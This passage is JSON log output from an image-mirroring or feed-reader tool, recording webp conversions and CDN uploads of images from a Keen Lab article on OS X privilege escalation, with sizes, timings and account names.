KB","compressRate":"78.2%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792270537.png","sourceStatusCode":200,"destWidth":822,"destHeight":161,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn73@2020_5/2020/10/19/02-33-08-976_008b86c159b0968f.webp","sourceBytes":14019,"destBytes":5874,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4234,"convertSpendMs":8,"createdTime":"2020-10-19 10:33:05","host":"us-52*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"13.7 KB","destSize":"5.7 KB","compressRate":"41.9%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/formula3.jpg","sourceStatusCode":200,"destWidth":1210,"destHeight":102,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn81@2020_2/2020/10/19/02-33-09-315_0a6ce5285bfa63d3.webp","sourceBytes":8011,"destBytes":1806,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4612,"convertSpendMs":13,"createdTime":"2020-10-19 10:33:05","host":"us-017*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.8 KB","destSize":"1.8 KB","compressRate":"22.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798364668.png","sourceStatusCode":200,"destWidth":985,"destHeight":456,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn50@2020_3/2020/10/19/02-33-09-161_5331ba653be35f4a.webp","sourceBytes":43089,"destBytes":49994,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4625,"convertSpendMs":26,"createdTime":"2020-10-19 10:33:05","host":"us-036*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"42.1 KB","destSize":"48.8 KB","compressRate":"116%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469800272540.png","sourceStatusCode":200,"destWidth":448,"destHeight":103,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn98@2020_5/2020/10/19/02-33-09-413_3301f4aa17c4ee64.webp","sourceBytes":73838,"destBytes":14810,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4718,"convertSpendMs":13,"createdTime":"2020-10-19 10:33:05","host":"us-033*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"72.1 KB","destSize":"14.5 KB","compressRate":"20.1%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793140738.png","sourceStatusCode":200,"destWidth":537,"destHeight":311,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn94@2020_1/2020/10/19/02-33-09-190_bc903b78122c525e.webp","sourceBytes":19303,"destBytes":16278,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4765,"convertSpendMs":12,"createdTime":"2020-10-19 10:33:05","host":"europe-56*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"18.9 KB","destSize":"15.9 KB","compressRate":"84.3%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799508728.png","sourceStatusCode":200,"destWidth":1858,"destHeight":588,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn57@2020_1/2020/10/19/02-33-09-508_5d603cc4ae3e283c.webp","sourceBytes":64385,"destBytes":55304,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":4967,"convertSpendMs":141,"createdTime":"2020-10-19 10:33:05","host":"us-025*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"62.9 KB","destSize":"54 KB","compressRate":"85.9%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792242612.png","sourceStatusCode":200,"destWidth":798,"destHeight":152,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn51@2020_6/2020/10/19/02-33-09-630_48dc78514cd26ccf.webp","sourceBytes":15360,"destBytes":6624,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5035,"convertSpendMs":7,"createdTime":"2020-10-19 10:33:05","host":"us-038*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"15 KB","destSize":"6.5 KB","compressRate":"43.1%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469785931993.png","sourceStatusCode":200,"destWidth":826,"destHeight":593,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn90@2020_2/2020/10/19/02-33-09-399_a635e981c1b69907.webp","sourceBytes":108223,"destBytes":29768,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5019,"convertSpendMs":23,"createdTime":"2020-10-19 10:33:05","host":"europe68*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"105.7 KB","destSize":"29.1 KB","compressRate":"27.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469793670597.png","sourceStatusCode":200,"destWidth":415,"destHeight":177,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn69@2020_2/2020/10/19/02-33-09-280_4daabd9d59f15bdc.webp","sourceBytes":110542,"destBytes":31358,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5027,"convertSpendMs":9,"createdTime":"2020-10-19 10:33:05","host":"europe64*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"108 KB","destSize":"30.6 KB","compressRate":"28.4%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469792304375.png","sourceStatusCode":200,"destWidth":789,"destHeight":185,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn61@2020_5/2020/10/19/02-33-09-897_8f1fdf0229caa7dc.webp","sourceBytes":20134,"destBytes":7408,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5362,"convertSpendMs":14,"createdTime":"2020-10-19 10:33:05","host":"us-013*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.7 KB","destSize":"7.2 KB","compressRate":"36.8%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469799496455.png","sourceStatusCode":200,"destWidth":1858,"destHeight":588,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn78@2020_3/2020/10/19/02-33-09-921_86f143d1bec9e414.webp","sourceBytes":65063,"destBytes":55656,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":5377,"convertSpendMs":214,"createdTime":"2020-10-19 10:33:05","host":"us-029*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"63.5 KB","destSize":"54.4 KB","compressRate":"85.5%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469798724994.png","sourceStatusCode":200,"destWidth":985,"destHeight":574,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn65@2020_3/2020/10/19/02-33-10-426_4b4d4c0f4c1e34c0.webp","sourceBytes":44107,"destBytes":34386,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":6400,"convertSpendMs":373,"createdTime":"2020-10-19 10:33:05","host":"us-001*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"43.1 KB","destSize":"33.6 KB","compressRate":"78%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/en/img/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/1469786702894.png","sourceStatusCode":200,"destWidth":1097,"destHeight":407,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn2@2020_2/2020/10/19/02-33-11-779_53b074f5105aeb35.webp","sourceBytes":579000,"destBytes":105834,"targetWebpQuality":75,"feedId":17218,"totalSpendMs":7357,"convertSpendMs":64,"createdTime":"2020-10-19 10:33:05","host":"us-021*","referer":"http://keenlab.tencent.com/2016/07/29/The-Journey-of-a-complete-OSX-privilege-escalation-with-a-single-vulnerability-Part-1/","linkMd5ListStr":"1c0ad2a8b68a69aabfd76bcf72d6e89b","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"565.4 KB","destSize":"103.4 KB","compressRate":"18.3%"}],"successGithubMap":{"myreaderx25":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx4":1,"myreaderx10":1,"myreaderx11":1,"myreaderx3":1,"myreaderx33":1,"myreaderx2":1,"myreaderx1":1,"myreaderx24":1,"myreaderx13":1,"myreaderx31":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx23":1}}